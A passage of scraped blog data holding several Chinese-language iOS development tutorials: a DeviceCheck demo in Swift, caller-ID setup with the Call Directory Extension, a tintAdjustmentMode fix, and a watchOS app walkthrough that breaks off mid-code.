1.查詢儲存資料： https://api.devicecheck.apple.com/v1/query_two_bits//Headers:Authorization: Bearer xxxxxx.xxxxxx.xxxxxx (組合的JWT字串)//Content:device_token:deviceToken (要查詢的裝置Token)transaction_id:UUID().uuidString (查詢識別符，這裡直接用UUID代表)timestamp: 請求時間戳（毫秒），注意！這裡是毫秒（EX: 1556549164000）回傳狀態：官方文件回傳內容：{ \"bit0\": Int：2 bits 資料中第一位的資料：0或1, \"bit1\": Int：2 bits 資料中第二位的資料：0或1, \"last_update_time\": String：\"最後修改時間 YYYY-MM\"}p.s. 你沒看錯，最後修改時間就只能顯示到年-月2.寫入儲存資料： https://api.devicecheck.apple.com/v1/update_two_bits//Headers:Authorization: Bearer xxxxxx.xxxxxx.xxxxxx (組合的JWT字串)//Content:device_token:deviceToken (要查詢的裝置Token)transaction_id:UUID().uuidString (查詢識別符，這裡直接用UUID代表)timestamp: 請求時間戳（毫秒），注意！這裡是毫秒（EX: 1556549164000）bit0: 2 bits 資料中第一位的資料：0或1bit1: 2 bits 資料中第二位的資料：0或15. 取得Apple伺服器回傳結果回傳狀態：官方文件回傳內容：無，回傳狀態 200 即表示寫入成功！6. 後端API回傳結果給APPAPP在針對相應的狀態做回應就完成了！後端部分補充：這邊太久沒碰PHP了，有興趣請參考 iOS11で追加されたDeviceCheckについて 這篇文章的 requestToken.php 部分Swift 版示範Demo：因後端部分我無法提供實作且不是大家都會PHP，這邊提供一個用純iOS (Swift) 做的範例，直接在APP裡處理後端該做的那些事(組JWT,發送資料給頻果)，給大家做參考！不需撰寫後端程式就能模擬執行所有內容． ⚠請注意 僅為測試示範所需，不建議用於正式環境 ⚠這邊要感謝 Ethan Huang 大大的 CupertinoJWT 提供 iOS 在APP內產生JWT格式內容的支援！Demo 主要程式及畫面：import UIKitimport DeviceCheckimport CupertinoJWTextension String { var queryEncode:String { return self.addingPercentEncoding(withAllowedCharacters: .whitespacesAndNewlines)?.replacingOccurrences(of: \"+\", with: \"%2B\") ?? \"\" }}class ViewController: UIViewController { @IBOutlet weak var getBtn: UIButton! @IBOutlet weak var statusBtn: UIButton! @IBAction func getBtnClick(_ sender: Any) { DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //正式情況： //POST deviceToken 到後端，請後端去跟蘋果伺服器查詢，然後再回傳結果給APP處理 //!!!!!!以下僅為測試、示範所需，不建議用於正式環境!!!!!! //!!!!!! 請勿隨意暴露您的PRIVATE KEY !!!!!! let p8 = \"\"\" -----BEGIN PRIVATE KEY----- -----END PRIVATE KEY----- \"\"\" let keyID = \"\" //你的KEY ID let teamID = \"\" //你的Developer Team ID :https://developer.apple.com/account/#/membership let jwt = JWT(keyID: keyID, teamID: teamID, issueDate: Date(), expireDuration: 60 * 60) do { let token = try jwt.sign(with: p8) var request = URLRequest(url: URL(string: \"https://api.devicecheck.apple.com/v1/update_two_bits\")!) request.httpMethod = \"POST\" request.addValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\") request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") let json:[String : Any] = [\"device_token\":deviceToken,\"transaction_id\":UUID().uuidString,\"timestamp\":Int(Date().timeIntervalSince1970.rounded()) * 1000,\"bit0\":true,\"bit1\":false] request.httpBody = try? JSONSerialization.data(withJSONObject: json) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in guard let data = data else { return } print(String(data:data, encoding: String.Encoding.utf8)) DispatchQueue.main.async { self.getBtn.isHidden = true self.statusBtn.isSelected = true } } task.resume() } catch { // Handle error } //!!!!!!以上僅為測試、示範所需，不建議用於正式環境!!!!!! // } } override func viewDidLoad() { super.viewDidLoad() DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //正式情況： //POST deviceToken 到後端，請後端去跟蘋果伺服器查詢，然後再回傳結果給APP處理 //!!!!!!以下僅為測試、示範所需，不建議用於正式環境!!!!!! //!!!!!! 請勿隨意暴露您的PRIVATE KEY !!!!!! let p8 = \"\"\" -----BEGIN PRIVATE KEY----- -----END PRIVATE KEY----- \"\"\" let keyID = \"\" //你的KEY ID let teamID = \"\" //你的Developer Team ID :https://developer.apple.com/account/#/membership let jwt = JWT(keyID: keyID, teamID: teamID, issueDate: Date(), expireDuration: 60 * 60) do { let token = try jwt.sign(with: p8) var request = URLRequest(url: URL(string: \"https://api.devicecheck.apple.com/v1/query_two_bits\")!) request.httpMethod = \"POST\" request.addValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\") request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") let json:[String : Any] = [\"device_token\":deviceToken,\"transaction_id\":UUID().uuidString,\"timestamp\":Int(Date().timeIntervalSince1970.rounded()) * 1000] request.httpBody = try? JSONSerialization.data(withJSONObject: json) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in guard let data = data,let json = try? JSONSerialization.jsonObject(with: data, options: .mutableContainers) as? [String:Any],let stauts = json[\"bit0\"] as? Int else { return } print(json) if stauts == 1 { DispatchQueue.main.async { self.getBtn.isHidden = true self.statusBtn.isSelected = true } } } task.resume() } catch { // Handle error } //!!!!!!以上僅為測試、示範所需，不建議用於正式環境!!!!!! // } // Do any additional setup after loading the view. }}畫面截圖這邊做的是一個一次性的優惠領取，每個裝置只能領一次！完整專案下載：有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,651 Total Views Last Statistics Date: 2025-01-19 | 2,530 Views on Medium. " }, { "title": "自己的電話自己辨識(Swift)", "url": "/posts/ac557047d206/", "categories": "ZRealm Dev.", "tags": "ios, whoscall, swift, ios-app-development, ios-apps", "date": "2019-04-28 00:07:27 +0800", "snippet": "自己的電話自己辨識(Swift)iOS自幹 Whoscall 來電辨識、電話號碼標記 功能起源一直以來都是Whoscall的忠實用戶，從原本用Android手機時就有使用，能夠非常即時的顯示陌生來電資訊，當下就能直接決定接通與否；後來轉跳蘋果陣營，第一隻蘋果手機是iPhone 6 (iOS 9)，那時在使用Whoscall上非常彆扭，無法即時辨識電話，要複製電話號碼去APP查詢，後期Whos...", "content": "自己的電話自己辨識(Swift)iOS自幹 Whoscall 來電辨識、電話號碼標記 功能起源一直以來都是Whoscall的忠實用戶，從原本用Android手機時就有使用，能夠非常即時的顯示陌生來電資訊，當下就能直接決定接通與否；後來轉跳蘋果陣營，第一隻蘋果手機是iPhone 6 (iOS 9)，那時在使用Whoscall上非常彆扭，無法即時辨識電話，要複製電話號碼去APP查詢，後期Whoscall提供將陌生電話資料庫安裝在本地手機的服務，雖然能解決即時辨識的問題，但很容易就弄亂你的手機通訊錄！直到 iOS 10+ 之後蘋果開放電話辨識功能(Call Directory Extension)權限給開發者，才使whoscall目前至少就體驗來說已和Android版無太大缺別，甚至超越Android版(Android版廣告超多，但以開發者的立場是可以理解的)用途？Call Directory Extension 能做到什麼呢？ 電話 撥打 辨識標記 電話 來電 辨識標記 通話紀錄 辨識標記 電話 拒接 黑名單設置限制？ 使用者需手動進入「設定」「電話」「通話封鎖與識別」打開您的APP才能使用 僅能以離線資料庫方式辨識電話(無法即時取得來電資訊然後Call API查詢，僅能預先寫入號碼&lt;-&gt;名稱對應在手機資料庫中)*也因此Whoscall會定期推播請使用者開APP更新來電辨識資料庫 數量上限？目前沒查到資料，應該是依照使用者手機容量無特別上限；但是數量多得辨識清單、封鎖清單要分批處理寫入！ 軟體限制：iOS 版本需 ≥ 10「設定」-&gt;「電話」-&gt;「通話封鎖與識別」應用場景？ 通訊軟體、辦公室通訊軟體；在APP內你可能有對方的聯絡人，但實際並未將手機號碼加入手機通訊錄中，這個功能就能避免同事甚至老闆來電時，被當陌生電話，結果漏接． 敝站( 結婚吧 )或敝私的( 591房屋交易 )，使用者與店家或房東聯繫時所撥打的電話都是我們的轉接號碼，經由轉接中心在轉撥到目標電話，大致流程如下：使用者所撥打的電話都是轉接中心代表號( #分機)，不會知道真實的電話號碼；一方面是保護個資隱私、另一方面也能知道有多少人聯絡商家(評估成效)甚至能知道是在哪看到然後撥打的(EX:網頁顯示#1234,APP顯示#5678)、還有也能推免費服務，由我方吸收電話通信費用．但此做法會帶來ㄧ項不可避免的問題，就是電話號碼凌亂；無法辨識出是打給誰或是店家回撥時，使用者不知道來電者是誰，透過使用電話辨識功能就能大大解決這個問題，提升使用者體驗！直接上一張成品圖：結婚吧 APP可以看到在輸入電話、電話來電時能直接顯示辨識結果、通話記錄列表也不在亂糟糟ㄧ樣能在下方顯示辨識結果．Call Directory Extension 電話辨識功能運作流程：開工：讓我們開始動手做吧！1.為 iOS 專案加入 Call Directory ExtensionXcode -&gt; File -&gt; New -&gt; Target選擇 Call Directory Extension輸入Extension名稱可順帶加入 Scheme 方便 Debug目錄底下就會出現Call Directory Extension的資料夾及程式2.開始編寫 Call Directory Extension 相關程式首先回到主 iOS 專案上第一個問題是我們該如何判斷使用者的裝置支不支援Call Directory Extension或是設定中的「通話封鎖與識別」是否已經打開：import CallKit////......//if #available(iOS 10.0, *) { CXCallDirectoryManager.sharedInstance.getEnabledStatusForExtension(withIdentifier: \"這裡輸入call directory extension的bundle identifier\", completionHandler: { (status, error) in if status == .enabled { //啟用中 } else if status == .disabled { //未啟用 } else { //未知,不支援 } })}前面有提到，來電辨識的運作方式是要在本地維護一個辨識資料庫；再來就是重頭戲該如何達成這個功能？很遺憾，您無法直接對Call Directory Extension進行呼叫寫入資料，所以你需要多維護一層對應結構，然後Call Directory Extension再去讀取你的結構再寫入辨識資料庫中，流程如下：意旨我們需要多維護一個自己的資料庫文件，再讓Extenstion去讀取寫入到手機中那所謂的辨識資料、檔案該長怎樣？ 其實就是個Dictionary結構，如：[“電話”:”王大明”] 存在本地的檔案可用一些Local DB(但Extension那邊也要能裝能用)，這邊是直接存一個.json檔在手機裡； 不建議直接存在UserDefaults，如果是測試或資料很少可以，實際應用強烈不建議！好的，開始：if #available(iOS 10.0, *) { if let dir = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"你的跨Extesion,Group Identifier名稱\") { let fileURL = dir.appendingPathComponent(\"phoneIdentity.json\") var datas:[String:String] = [\"8869190001234\":\"李先生\",\"886912002456\":\"大帥\"] if let content = try? String(contentsOf: fileURL, encoding: .utf8),let text = content.data(using: .utf8),let json2 = try? JSONSerialization.jsonObject(with: text, options: .mutableContainers) as? Dictionary&lt;String,String&gt;,let json = json2 { datas = json } if let data = jsonToData(jsonDic: datas) { DispatchQueue(label: \"phoneIdentity\").async { if let _ = try? data.write(to: fileURL) { //寫入json檔完成 } } } }}就只是一般的本地檔案維護，要注意的就是目錄需要在Extesion也能讀取的地方。補充 — 電話號碼格式： 台灣地區市話、手機都需去掉0以886代替：如 0255667788 -&gt; 886255667788 電話格式是純數字組合的字串，勿夾雜「-」、「,」、「#」…等符號 市話電話如有包含要辨識到 分機 ，直接接在後面即可不需帶任何符號：如 0255667788,0718 -&gt; 8862556677880718 將一般iOS電話格式轉換成辨識資料庫可接受格式可參考以下兩個取代方法：var newNumber = \"0255667788,0718\"if let regex = try? NSRegularExpression(pattern: \"^0{1}\") { newNumber = regex.stringByReplacingMatches(in: newNumber, options: [], range: NSRange(location: 0, length: newNumber.count), withTemplate: \"886\")}if let regex = try? NSRegularExpression(pattern: \",\") { newNumber = regex.stringByReplacingMatches(in: newNumber, options: [], range: NSRange(location: 0, length: newNumber.count), withTemplate: \"\")}再來就是如流程，辨識資料已維護好；需要通知Call Directory Extension去刷新手機那邊的資料：if #available(iOS 10.0, *) { CXCallDirectoryManager.sharedInstance.reloadExtension(withIdentifier: \"tw.com.marry.MarryiOS.CallDirectory\") { errorOrNil in if let error = errorOrNil as? CXErrorCodeCallDirectoryManagerError { print(\"reload failed\") switch error.code { case .unknown: print(\"error is unknown\") case .noExtensionFound: print(\"error is noExtensionFound\") case .loadingInterrupted: print(\"error is loadingInterrupted\") case .entriesOutOfOrder: print(\"error is entriesOutOfOrder\") case .duplicateEntries: print(\"error is duplicateEntries\") case .maximumEntriesExceeded: print(\"maximumEntriesExceeded\") case .extensionDisabled: print(\"extensionDisabled\") case .currentlyLoading: print(\"currentlyLoading\") case .unexpectedIncrementalRemoval: print(\"unexpectedIncrementalRemoval\") } } else if let error = errorOrNil { print(\"reload error: \\(error)\") } else { print(\"reload succeeded\") } }}使用以上方法通知Extension刷新，並取得執行結果。（這時候會呼叫執行Call Directory Extension裡的beginRequest，請繼續往下看）主 iOS 專案的程式就到這了！3.開始修改 Call Directory Extension 的程式打開Call Directory Extension 目錄，找到底下已經幫你建立好的檔案 CallDirectoryHandler.swift能實作的方法只有 beginRequest 當要處理手機電話資料時的動作，預設範例都把我們建好了，不太需要去動： addAllBlockingPhoneNumbers ：處理加入黑名單號碼(全新增) addOrRemoveIncrementalBlockingPhoneNumbers ：處理加入黑名單號碼(遞增方式) addAllIdentificationPhoneNumbers ：處理加入來電辨識號碼(全新增) addOrRemoveIncrementalIdentificationPhoneNumbers ：處理加入來電辨識號碼(遞增方式)我們只要完成以上的Function實作即可，黑名單功能跟來電辨識方式原理都ㄧ樣這邊就不多作介紹．private func fetchAll(context: CXCallDirectoryExtensionContext) { if let dir = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"你的跨Extesion,Group Identifier名稱\") { let fileURL = dir.appendingPathComponent(\"phoneIdentity.json\") if let content = try? String(contentsOf: fileURL, encoding: .utf8),let text = content.data(using: .utf8),let numbers = try? JSONSerialization.jsonObject(with: text, options: .mutableContainers) as? Dictionary&lt;String,String&gt; { numbers?.sorted(by: { (Int($0.key) ?? 0) &lt; Int($1.key) ?? 0 }).forEach({ (obj) in if let number = CXCallDirectoryPhoneNumber(obj.key) { autoreleasepool{ if context.isIncremental { context.removeIdentificationEntry(withPhoneNumber: number) } context.addIdentificationEntry(withNextSequentialPhoneNumber: number, label: obj.value) } } }) } }}private func addAllIdentificationPhoneNumbers(to context: CXCallDirectoryExtensionContext) { // Retrieve phone numbers to identify and their identification labels from data store. For optimal performance and memory usage when there are many phone numbers, // consider only loading a subset of numbers at a given time and using autorelease pool(s) to release objects allocated during each batch of numbers which are loaded. // // Numbers must be provided in numerically ascending order. // let allPhoneNumbers: [CXCallDirectoryPhoneNumber] = [ 1_877_555_5555, 1_888_555_5555 ] // let labels = [ \"Telemarketer\", \"Local business\" ] // // for (phoneNumber, label) in zip(allPhoneNumbers, labels) { // context.addIdentificationEntry(withNextSequentialPhoneNumber: phoneNumber, label: label) // } fetchAll(context: context)}private func addOrRemoveIncrementalIdentificationPhoneNumbers(to context: CXCallDirectoryExtensionContext) { // Retrieve any changes to the set of phone numbers to identify (and their identification labels) from data store. For optimal performance and memory usage when there are many phone numbers, // consider only loading a subset of numbers at a given time and using autorelease pool(s) to release objects allocated during each batch of numbers which are loaded. // let phoneNumbersToAdd: [CXCallDirectoryPhoneNumber] = [ 1_408_555_5678 ] // let labelsToAdd = [ \"New local business\" ] // // for (phoneNumber, label) in zip(phoneNumbersToAdd, labelsToAdd) { // context.addIdentificationEntry(withNextSequentialPhoneNumber: phoneNumber, label: label) // } // // let phoneNumbersToRemove: [CXCallDirectoryPhoneNumber] = [ 1_888_555_5555 ] // // for phoneNumber in phoneNumbersToRemove { // context.removeIdentificationEntry(withPhoneNumber: phoneNumber) // } //context.removeIdentificationEntry(withPhoneNumber: CXCallDirectoryPhoneNumber(\"886277283610\")!) //context.addIdentificationEntry(withNextSequentialPhoneNumber: CXCallDirectoryPhoneNumber(\"886277283610\")!, label: \"TEST\") fetchAll(context: context) // Record the most-recently loaded set of identification entries in data store for the next incremental load...}因為敝站的資料不會到太多而且我的本地資料結構相當簡易，無法做到遞增；所以這邊 統一都用全新增的方式，如是遞增方式則要先刪除舊的(這步很重要不然會reload extensiton失敗！)完工！到此為止就完成囉！實作方面非常簡單！Tips: 如果在「設定」「電話」「通話封鎖與識別」打開APP時一直轉或是打開後無法辨識號碼，可先確認號碼是否正確、本地維護的.json資料是否正確、reload extensiton是否成功；或重開機試試，都找不出來可以選call directory extension的Scheme Build 看看錯誤訊息． 這個功能 最困難的點不是程式方面而是要引導使用者手動去設定打開 ，具體方式及引導可參考whoscall：Whoscall有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 3,913 Total Views Last Statistics Date: 2025-01-19 | 3,833 Views on Medium. " }, { "title": "iOS tintAdjustmentMode 屬性", "url": "/posts/6012b7b4f612/", "categories": "ZRealm Dev.", "tags": "uikit, swift, ios-app-development, autolayout, 顧小事成大事", "date": "2019-02-07 00:10:43 +0800", "snippet": "iOS tintAdjustmentMode 屬性Present UIAlertController 時本頁上的 Image Assets (Render as template) .tintColor 設定失效問題問題修正前後比較ㄧ樣不囉唆解釋，直接上比較圖．左修正前/右修正後可以看到左方ICON圖在有Present UIAlertController時tintColor顏色設定失效，另外...", "content": "iOS tintAdjustmentMode 屬性Present UIAlertController 時本頁上的 Image Assets (Render as template) .tintColor 設定失效問題問題修正前後比較ㄧ樣不囉唆解釋，直接上比較圖．左修正前/右修正後可以看到左方ICON圖在有Present UIAlertController時tintColor顏色設定失效，另外當Present的視窗關閉後就會恢復顏色設定顯示正常．問題修正首先介紹一下 tintAdjustmentMode 的屬性設置，此屬性控制了 tintColor 的顯示模式，此屬性有三個枚舉可設定： .Automatic ：視圖的 tintAdjustmentMode 與包覆的父視圖設定一致 .Normal ： 預設模式 ，正常顯示設定的 tintColor .Dimmed ：將 tintColor 改為低飽和度、暗淡的顏色（就是灰色啦！）上述問題不是什麼BUG而是系統本身機制即是如此： 在Present UIAlertController時會將本頁Root ViewController上View的 tintAdjustmentMode 改為 Dimmed （所以準確來說也不叫顏色設定「失效」，只是 tintAdjustmentMode 模式更改）但有時我們希望ICON顏色能保持ㄧ致則只需在UIView中tintColorDidChange事件保持tintAdjustmentMode設定ㄧ致：extension UIButton { override func tintColorDidChange() { self.tintAdjustmentMode = .normal //永遠保持normal }}extension example結束！不是什麼大問題，不改也沒差，但就是礙眼其實每一個頁面遇到present UIAlertController、action sheet、popover…都會將本頁view的tintAdjustmentMode改為灰色，但我在這個頁面才發現查找了一陣子資料才發現跟這個屬性有關係，設定之後就解決我的小疑惑．有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 273 Total Views Last Statistics Date: 2025-01-19 | 235 Views on Medium. " }, { "title": "動手做一支 Apple Watch App 吧！", "url": "/posts/e85d77b05061/", "categories": "ZRealm Dev.", "tags": "ios, watchos, apple-watch-apps, watchkit, ios-app-development", "date": "2019-02-06 00:23:30 +0800", "snippet": "動手做一支 Apple Watch App 吧！(Swift)watchOS 5 手把手開發Apple Watch App 從無到有[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往前言:暨上一篇 Apple Watch 入手開箱文 後已經過了快三個月，最近終於找到機會研究開發Apple Watch App啦。結婚吧 — 最大婚禮籌備...", "content": "動手做一支 Apple Watch App 吧！(Swift)watchOS 5 手把手開發Apple Watch App 從無到有[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往前言:暨上一篇 Apple Watch 入手開箱文 後已經過了快三個月，最近終於找到機會研究開發Apple Watch App啦。結婚吧 — 最大婚禮籌備App補一下使用三個月後的心得：1. e-sim(LTE)依然還想不到什麼時候會用到，所以也還沒申請沒用過2.常用功能：靠近解鎖Mac電腦、舉手查看通知、Apple Pay3.健康提醒：過了三個月已開始懶了，通知提醒都看看，沒達成圓圈也無感4.第三方App支援度依然很差5.錶面可依照心情任意更換增加新鮮感6.更詳細的運動紀錄：例如走遠一點路去買晚餐，手錶會自動偵測詢問是否要記錄運動使用三個月後整體來說，還是如原開箱文所寫就像是多個生活小助手，幫你解決瑣碎的事．第三方App支援度依然很差在我實際開發過Apple Watch App之前還很納悶，為何Apple Watch上的App都很陽春甚至就只是「堪用」罷了，包括LINE(訊息不同步而且從未更新)、Messenger(就是堪用)；直到我實際開發過Apple Watch App之後才知道這些開發者的苦衷….首先，了解Apple Watch App的定位，化繁為簡Apple Watch的定位 「不是取代iPhone，而是輔助」 不論是官方介紹、官方App、watchOS API都是這個走向；所以才會覺得第三方APP很陽春、功能很少(抱歉，我太貪心了Orz)以 我們的A pp為例，有搜尋商家、查看專欄、討論區、線上詢問…等等功能；線上詢問就是有價值搬上Apple Watch的項目，因為他需要即時性而且更快速的回覆代表更有機會獲得訂單；搜尋商家、查看專欄、討論區這些功能相對複雜，在手錶上就算做的到也意義不大(螢幕能呈現的資訊太少、也不需要即時性)核心概念還是「以輔助為主」，所以並不是什麼功能都需要搬上Apple Watch；畢竟使用者很少很少時間會是只有戴手錶沒帶手機，而遇到這種情況時，使用者的需求也只有重要的功能(像查看專欄文章這種沒有重要到一定要立刻馬上用手錶看)讓我們開始吧！ 這也是我第一次開發Apple Watch App，文章內容可能不夠深入，敬請大家指教！！ 本篇只適合有開發過iOS App/UIKit基礎的讀者閱讀 本篇使用：iOS ≥ 9、watchOS ≥ 5為iOS專案新建 watchOS Target:File -&gt; New -&gt; Target -&gt; watchOS -&gt; WatchKit App*Apple Watch App無法獨立安裝，一定要依附在 iOS App 之下新建好之後目錄會長這樣：你會發現有兩個Target項目，缺一不可： WatchKit App: 負責存放資源、UI顯示/Interface.storyboard：同 iOS，裡面有系統預設建立的視圖控制器/Assets.xcassets：同 iOS，存放用到的資源項目/info.plist：同 iOS，WatchKit App 相關設定 WatchKit Extension: 負責程式呼叫、邏輯處理( * .swift)/InterfaceController.swift：預設的視圖控制器程式/ExtensionDelegate.swift：類似Swift的AppDelegate，Apple Watch App 啟動入口/NotificationController.swift：用於處理Apple Watch App上的推播顯示/Assets.xcassets：這裡不使用，我統一放在WatchKit App的Assets.xcassets下/info.plist：同 iOS，WatchKit Extension 相關設定/PushNotificationPayload.apns：推播資料，可用在模擬器上測試推播功能細節會在後面做介紹，先大概了解一下目錄及文件內容功能即可。視圖控制器：在AppleWatch中視圖控制器不叫ViewController而是InterfaceController ，你可以在WatchKit App/Interface.storyboard中找到Interface Controller Scence，控制它的程式就放在WatchKit Extension/InterfaceController.swift中(同iOS概念)Scene預設會和Notification Controller Scene擠在一起 (我會把它拉上面一點分開)可在右方設定InterfaceController的標題顯示文字．標題顏色部分吃的是Interface Builder Document/Global hint設定，整個App的風格顏色會是統一的．元件庫：沒有太多複雜的元件，元件功能也都簡單明瞭UI 排版：萬丈高樓從View起，排版的部分沒有 UIKit(iOS) 中的Auto Layout、約束、圖層，全都使用參數進行排版設置，更簡單有力(排起來有點像 UIKit 中的 UIStackView) 一切排版由Group組成，類似UIKit中的 UIStackView 但能設置更多排版參數Group的參數設置 Layout：設置被包在裡面的子View排版方式（水平、垂直、圖層堆疊） Insets：設置Group的上下左右間距 Spacing：設置被包在裡面的子View之間的間距 Radius：設置Group的圓角，沒錯！WatchKit自帶圓角設置參數 Alignment/Horizontal：設置水平對齊方式（左、中、右）與鄰居、外層包覆的View設置會有所連動 Alignment/Vertical：設置垂直對齊方式（上、中、下）與鄰居、外層包覆的View設置會有所連動 Size/Width：設置Group的大小，有三種模式可選「Fixed：指定寬度」、「Size To Fit Content：依照內容子View大小決定寬度」、「Relative to Container：參照外層包覆的View大小為寬度(可設%/+ -修正值)」 Size/Height：同Size/Width，此項是設置高度字型/字體大小設置：可直接套用系統的Text Styles，或使用Custom（但這邊我測試使用Custom無法設定字體大小）；所以 我是使用System 自訂各顯示Label的字體大小做中學：以Line排版為例排版部分不像 iOS 那麼複雜，所以我直接透過範例示範給大家看，就能直接上手；以 Line 的主頁排版為例子：在WatchKit App/Interface.storyboard中找到Interface Controller Scence:1.整個頁面，相當於 iOS App 開發中會使用到的 UITableView，在Apple Watch App 中簡化了操作，名字也改叫做「WKInterfaceTable」首先就先拉一個Table到Interface Controller Scence中同UIKit UITableView，有Table本體、有Cell(Apple Watch中叫做Row)；使用起來簡化許多， 你可以直接在此介面上進行Cell的設計排版！2. 分析排版架構，設計Row顯示樣式：要排出一個左邊有圓角滿版的Image且堆疊一個Label，右邊平均分配上下兩個區塊，上方放Label，下方也放Label的區塊2–1: 拉出左右兩區塊的架構拉兩個Group到Group中，並對Size參數分別設定：左邊綠色部分：Layout設定Overlap，裡面子View要做未讀訊息Label的圖層堆疊顯示設固定長寬40的正方形右邊紅色部分：Layout設定Vertical，裡面子View要做上下兩個顯示寬度設定參照外層，比例100%，扣掉左邊綠色部分40左右容器內排版：左邊部分：拉入一個Image，再拉入一個包覆Lable的Group對齊設右下(Group設底色再設間距及圓角)右邊部分：拉入兩個Label，一個對齊設左上，一個對齊設左下即可為Row命名(同UIKit UITableView為Cell設定identifier)：選定Row-&gt;Identifier-&gt;輸入自訂名稱Row的呈現樣式不只一種呢？非常簡單，只要在拉一個Row放在Table裡(實際要顯示哪個樣式的ROW由程式控制)並輸入Identifier命名即可這邊我再拉一個Row用於呈現無資料時的提示排版相關資訊watchKit的hidden不會佔位，可拿來做交互應用（有登入才顯示Table；沒登入顯示提示Label）排版到此告一段落，可依照個人設計做修改；上手容易，多排個幾次、玩玩對齊參數，就能熟悉！程式控制部分：接續Row，我們需要建立一個Class對Row進行參照操作：class ContactRow:NSObject {}class ContactRow:NSObject { var id:String? @IBOutlet var unReadGroup: WKInterfaceGroup! @IBOutlet var unReadLabel: WKInterfaceLabel! @IBOutlet weak var imageView: WKInterfaceImage! @IBOutlet weak var nameLabel: WKInterfaceLabel! @IBOutlet weak var timeLabel: WKInterfaceLabel!}拉outlet、儲存變數Table部分ㄧ樣拉Outlet到Controller中：class InterfaceController: WKInterfaceController { @IBOutlet weak var Table: WKInterfaceTable! override func awake(withContext context: Any?) { super.awake(withContext: context) // Configure interface objects here. } override func willActivate() { // This method is called when watch view controller is about to be visible to user super.willActivate() } struct ContactStruct { var name:String var image:String var time:String } func loadData() { //Get API Call Back... //postData { let data:[ContactStruct] = [] //api returned data... self.Table.setNumberOfRows(data.count, withRowType: \"ContactRow\") //如果你有多種ROW需要呈現則用： //self.Table.setRowTypes([\"ContactRow\",\"ContactRow2\",\"ContactRow3\"]) // for item in data.enumerated() { if let row = self.Table.rowController(at: item.offset) as? ContactRow { row.nameLabel.setText(item.element.name) //assign value to lable/image...... } } //} } override func didDeactivate() { // This method is called when watch view controller is no longer visible super.didDeactivate() loadData() } //處理Row點選時: override func table(_ table: WKInterfaceTable, didSelectRowAt rowIndex: Int) { guard let row = table.rowController(at: rowIndex) as? ContactRow,let id = row.id else { return } self.pushController(withName: \"showDetail\", context: id) }}Table的操作簡化許多沒有delegate/datasource，設定資料方式只要呼叫setNumberOfRows/setRowTypes指定Row數量和形態，再使用rowController(at:) 設定每列的資料內容即可！Table的Row選擇事件也只需 override func table( _ table: WKInterfaceTable, didSelectRowAt rowIndex: Int) 即可操作！(Table也只有這個事件)如何跳頁？首先為Interface Controller設定IdentifierwatchKit有兩種跳頁模式：1.類似iOS UIKit pushself.pushController(withName: Interface Controller Identifier , context: Any? )push方式可左上返回返回上一頁同iOS UIKit：self.pop( )返回根頁面：self.popToRootController( )開新頁面：self.presentController( )2. 頁籤顯示方式 WKInterfaceController.reloadRootControllers(withNames: [ Interface Controller Identifier ], contexts: [ Any? ] )亦或是在Storyboard上，在第一頁的Interface Controller上按Control+Click拖曳到第二頁選擇「next page」也可頁籤顯示方式可以左右切換頁面兩種跳頁方式不能混用．跳頁參數？不像iOS需要使用自訂delegate或segue方式傳遞參數，watchKit跳頁帶參數方式就是將參數放入上方方法中的 contexts 中即可．接收參數在 InterfaceController 的 awake(withContext context: Any?)例如我在A頁面要跳到B頁面並帶入id:Int時：A 頁面:self.pushController(withName: \"showDetail\", context: 100)B 頁面:override func awake(withContext context: Any?) { super.awake(withContext: context) guard let id = context as? Int else { print(\"參數錯誤！\") self.popToRootController() return } // Configure interface objects here.}程式控制元件部分相比iOS UIKit一樣簡化許多，有開發過iOS的應該上手很快！例如label變成setText( )p.s. 而且居然沒有getText的方法，只能extension變數或放在外部變數儲存與iPhone之間同步/資料傳遞如果有開發過iOS 相關 Extension 的話；下意識一定是用App Groups共享UserDefaults的方式，當初我也興沖沖的這樣做，然後卡了好久發現資料一直過不去，直到上網一查才發現，watchOS&gt;2之後就不再支援此方法了….要使用新的WatchConnectivity方式讓手機跟手錶之間進行通訊(類似socket概念)，iOS手機及手錶watchOS兩端都需要實做，我們寫成singleton模式如下：手機端：import WatchConnectivityclass WatchSessionManager: NSObject, WCSessionDelegate { @available(iOS 9.3, *) func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: Error?) { //手機端session啟用完成 } func session(_ session: WCSession, didReceiveUserInfo userInfo: [String : Any] = [:]) { //手機端接受到手錶傳回的UserInfo } func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -&gt; Void) { //手機端接受到手錶回傳的Message } //另外還有didReceiveMessageData,didReceiveFile同樣都是處理收到手錶回傳的資料 //看你的資料傳遞接收需求決定要用哪個 func sendUserInfo() { guard let validSession = self.validSession,validSession.isReachable else { return } if userDefaultsTransfer?.isTransferring == true { userDefaultsTransfer?.cancel() } var list:[String:Any] = [:] //將UserDefaults放入list.... self.userDefaultsTransfer = validSession.transferUserInfo(list) } func sessionReachabilityDidChange(_ session: WCSession) { //與手錶APP連接狀態改變時(手錶開啟APP時/手錶關閉APP時) sendUserInfo() //我是當狀態改變，如為手錶開啟APP時就同步一次UserDefaults } func session(_ session: WCSession, didFinish userInfoTransfer: WCSessionUserInfoTransfer, error: Error?) { //完成同步UserDefaults(transferUserInfo) } func sessionDidBecomeInactive(_ session: 